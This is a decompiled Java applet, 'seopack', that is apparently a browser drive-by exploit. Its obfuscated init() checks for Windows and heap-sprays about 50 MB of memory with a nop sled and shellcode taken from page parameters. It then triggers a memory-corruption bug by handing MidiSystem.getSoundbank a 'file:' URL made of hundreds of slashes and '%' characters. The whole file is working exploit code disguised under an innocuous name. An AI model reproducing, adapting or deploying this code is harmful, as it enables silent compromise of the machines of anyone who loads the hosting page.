import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class seopack extends Applet
{
    private IntBuffer[] __b;
    
    public void init() {
        repeat('/', 302);
        if (System.getProperty("FUSfzos.bvyRj".substring(5, 8) + "namvAK7h".substring(0, 3) + "KqeJL4".substring(2, 3)).toLowerCase().indexOf("0ZwinH".substring(2, 5)) >= 0) {
            final String string = "t0fiZWK".substring(2, 4) + "D7le:".substring(2, 5) + "VQzhe//QU".substring(5, 7) + repeat('/', 302) + "Z%N6b".substring(0, 2) + "ckFZEZ%1V".substring(5, 7) + "0cl6wZ%Sd".substring(5, 7) + "SbQADZ%y".substring(5, 7) + "tFYUtZ%zP".substring(5, 7) + "snkMZ%Uv2f".substring(4, 6);
            try {
                this.__b = this.__w(this.getParameter("scCLcJ".substring(0, 2)), this.getParameter("stlpnpvp".substring(4, 6)));
                MidiSystem.getSoundbank(new URL(string));
                final long n = 10L;
                while (true) {
                    Thread.sleep(n);
                }
            }
            catch (Exception ex) {}
        }
    }
    
    public static String repeat(final char c, final int n) {
        String string = "";
        for (int i = 0; i < n; ++i) {
            string += c;
        }
        return string;
    }
    
    public static short[] _Z(final String s) {
        final short[] array = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(s.charAt(i), 16) & 0xFF) << 4) + (Character.digit(s.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public final IntBuffer[] __w(final String s, final String s2) {
        return this.__w(_Z(s), _Z(s2));
    }
    
    public final IntBuffer[] __w(final short[] array, final short[] array2) {
        final int n = 50;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        for (int i = 0; i < n; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            for (int j = 0; j < n3; ++j) {
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        return array3;
    }
}
